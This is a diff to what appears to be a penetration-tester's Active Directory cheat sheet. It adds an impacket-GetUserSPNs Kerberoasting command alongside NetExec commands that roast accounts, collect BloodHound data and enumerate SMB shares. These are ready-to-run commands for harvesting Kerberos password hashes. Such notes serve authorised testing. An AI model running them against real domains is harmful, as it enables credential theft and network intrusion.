@@ -810,6 +810,9 @@ nxc ldap <DC-IP> -u 'user' -p 'password' -d 'corp.local' --asreproast asrep.txt 
 nxc ldap <DC-IP> -u 'user' -p 'password' -d 'corp.local' --kerberoasting kerberoast.txt # Find Kerberoastable accounts / request hashes
 nxc ldap $target -u 'user' -p 'password' --bloodhound --collection All --dns-server $<DC-IP> #Bloodhound collection to map users
 
+#Kerbroasting
+faketime '+7h' impacket-GetUserSPNs '<Domain>/<USERNAME>:<PASSWORD>' -dc-ip <DOMAIN-IP> -request -outputfile kerberoast.hashes
+
 # Smbclient
 smbclient -L //IP #or try with 4 /'s
 smbclient //server/share
